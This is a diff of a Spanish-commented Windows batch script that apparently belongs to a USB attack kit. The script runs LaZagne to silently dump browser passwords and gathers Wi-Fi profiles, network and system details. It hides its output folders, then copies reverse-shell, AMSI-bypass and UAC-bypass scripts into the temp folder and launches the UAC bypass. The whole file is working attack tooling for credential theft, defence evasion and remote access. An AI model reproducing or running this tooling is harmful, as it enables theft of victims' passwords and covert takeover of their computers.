@@ -1,8 +1,5 @@
 @Echo off & Cls
 
-:: Nombre de la Usb
-Set USBLabel=HELLOWORLD
-
 :: Carpeta que donde se guardará la informacion
 Set CarpetaDestino=wPasswords
 
@@ -16,19 +13,14 @@ Set BrowserPassword=Tools\Windows\laZagne.py
 :: Formato: NOMBREPC-NOMBREUSUARIO
 Set Destino=%CarpetaDestino%\%COMPUTERNAME%-%USERNAME%
 
-:: Detectar la letra de nuestra usb
-::For /F "Tokens=3 Delims= " %%A In ('Echo list volume ^| diskpart ^| findstr "%USBLabel%"') do (set USB=%%A:)
-:: Is a nuestra usb
-%USB%
-
 :: Si no existe la carpeta la creamos
-If Not Exist "%Destino%" Mkdir "%USB%\%Destino%"
+If Not Exist "%Destino%" Mkdir "%Destino%"
 
 :: Ocultar la carpeta en el caso de que hayamos puesto que si, luego podemos desocultarla con 'Attrib -s -h "NombreCarpeta"
 If %OcultarCarpetaDestino%==SI ( Attrib +S +H "%CarpetaDestino%" )
 
 :: Ejecutamos la herramienta y guardamos el resultado en nuestra carpeta destino
-.\python\python.exe "%USB%\%BrowserPassword%" browsers -quiet -oN -output "%Destino%"
+.\python\python.exe "%BrowserPassword%" browsers -quiet -oN -output "%Destino%"
 
 
 :: Ejecutamos script para sacar wifi
@@ -42,13 +34,13 @@ attrib +s +h "WLAN_Profiles.txt"
 :: Archivo con ip-mac
 
 ipconfig /all >> %Destino%\%username%.txt
+systeminfo >> %Destino%\%username%_system.txt
 
 :: Ejecución de script para empezar la reverse shell
 
-copy scripts\hola.bat %temp% /Y| copy scripts\hola.vbs %temp% /Y | copy scripts\rev.ps1 %temp% /Y | copy scripts\reverse.ps1 %temp% /Y | copy scripts\ByUac.ps1 %temp% /Y | copy scripts\ByUac.bat %temp% /Y | copy scripts\Antiv.bat %temp% /Y | copy  scripts\Principal.bat %temp% /Y
+copy scripts\ocult.vbs %temp% /Y | copy scripts\rev.ps1 %temp% /Y | copy scripts\amsi.ps1 %temp% /Y | copy scripts\ByUac.ps1 %temp% /Y | copy  scripts\Principal.bat %temp% /Y
 
 c:
 
 cd %userprofile%\appdata\local\temp
-
-ByUac.bat
+Powershell -executionpolicy remotesigned -File ByUac.ps1
